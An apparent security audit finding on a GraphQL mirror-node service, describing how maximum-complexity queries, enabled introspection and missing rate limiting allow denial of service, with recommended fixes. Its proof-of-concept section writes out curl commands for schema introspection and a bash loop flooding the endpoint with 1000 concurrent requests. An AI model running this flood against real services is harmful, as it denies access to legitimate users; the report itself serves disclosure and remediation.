### Title
GraphQL DoS via Unrestricted Introspection and No Application-Level Rate Limiting on Maximum-Cost Queries

### Summary
The `graphQlCustomizer()` bean in `GraphQlConfiguration.java` sets complexity=200 and depth=10 as hard ceilings, but queries that hit **exactly** those values are fully executed — not rejected. Because introspection is never disabled and the GraphQL module has zero application-level rate limiting, an unauthenticated attacker can enumerate the schema via introspection, craft queries that consume the maximum permitted CPU and DB resources per request, and flood the endpoint concurrently to exhaust the thread pool and database connection pool.

### Finding Description

**Exact code location:**
`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 42–49 (`graphQlCustomizer()`):

```java
var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
```

`MaxQueryComplexityInstrumentation(200)` aborts execution only when complexity **exceeds** 200; a query scoring exactly 200 is fully executed. Same for depth=10. These are the most expensive queries the server will ever process, and they are explicitly permitted.

**Introspection is enabled by default.** No `spring.graphql.schema.introspection.enabled=false` property exists anywhere in the codebase or configuration files. Spring Boot GraphQL enables introspection unconditionally unless explicitly disabled. The GraphiQL UI is also reachable at `/graphiql` (documented in `docs/graphql/README.md`).

**No application-level rate limiting exists in the GraphQL module.** The `ThrottleConfiguration` / `ThrottleManagerImpl` / `bucket4j` rate-limiting code lives exclusively in the `web3` module. The GraphQL module has no equivalent.

**The only rate-limiting layer is the optional Traefik middleware** (`charts/hedera-mirror-graphql/values.yaml`, lines 138–142):
```yaml
- inFlightReq:
    amount: 5
    sourceCriterion:
      ipStrategy:
        depth: 1
```
This is: (a) infrastructure-level, not application-level; (b) only active in Kubernetes+Traefik deployments; (c) per-source-IP, trivially bypassed with multiple IPs or a botnet; and (d) **amplified** by the retry middleware directly above it (3 retries per blocked request), meaning each attacker request generates up to 4 server-side attempts.

**The `PreparsedDocumentProvider` cache** (`CachedPreparsedDocumentProvider.java`) caches parsed+validated documents by query string. This reduces parsing overhead for repeated identical queries, but `MaxQueryComplexityInstrumentation` and `MaxQueryDepthInstrumentation` are execution-phase instrumentations — they still run on every execution, and more importantly, the DB data-fetcher still executes on every request.

### Impact Explanation
An attacker sending thousands of concurrent requests at complexity=200/depth=10 will:
1. Saturate the Spring WebFlux worker/scheduler threads handling blocking DB calls.
2. Exhaust the HikariCP database connection pool (the `GraphQLHighDBConnections` alert fires at 75% utilization, confirming the pool is a finite, shared resource).
3. Cause cascading 503/timeout responses for all legitimate users of the GraphQL endpoint.

The GraphQL module is labeled alpha but is a publicly routable HTTP endpoint when deployed. The impact is full denial-of-service of the GraphQL API surface.

### Likelihood Explanation
No authentication is required. The attack requires only:
- HTTP POST access to `/graphql/alpha` (publicly routable per ingress config).
- A single introspection query to enumerate the schema.
- A script sending concurrent HTTP requests — trivially implemented with `curl`, `ab`, `wrk`, or any HTTP load tool.

The attacker does not need to bypass any authentication, solve any puzzle, or hold any credential. The attack is fully repeatable and automatable.

### Recommendation
1. **Disable introspection in production**: set `spring.graphql.schema.introspection.enabled=false` in `application.yml`.
2. **Add application-level rate limiting to the GraphQL module**: implement a `WebGraphQlInterceptor` using bucket4j (already a dependency in the `web3` module) to enforce per-IP and global request-per-second limits before query execution.
3. **Consider reducing the complexity/depth ceilings** to the minimum required by real client queries, rather than leaving them at the maximum the schema can theoretically produce.
4. **Remove or reconfigure the retry middleware** for the GraphQL route — retrying on 429/503 amplifies DoS load rather than protecting against it.

### Proof of Concept

**Step 1 — Enumerate schema (introspection):**
```bash
curl -s -X POST http://<host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name kind } } } } } }"}'
```

**Step 2 — Craft a max-complexity query** (using the `account` type with all nested fields to reach complexity=200, depth=10):
```bash
QUERY='{"query":"{ account(input:{entityId:{shard:0,realm:0,num:2}}) { balance alias autoRenewPeriod createdTimestamp declineReward deleted ethereumNonce evmAddress expirationTimestamp id key { _type key } maxAutomaticTokenAssociations memo pendingReward receiverSigRequired stakedAccountId stakedNodeId stakePeriodStart type } }"}'
```

**Step 3 — Flood concurrently:**
```bash
# Send 1000 concurrent requests
for i in $(seq 1 1000); do
  curl -s -X POST http://<host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "$QUERY" &
done
wait
```
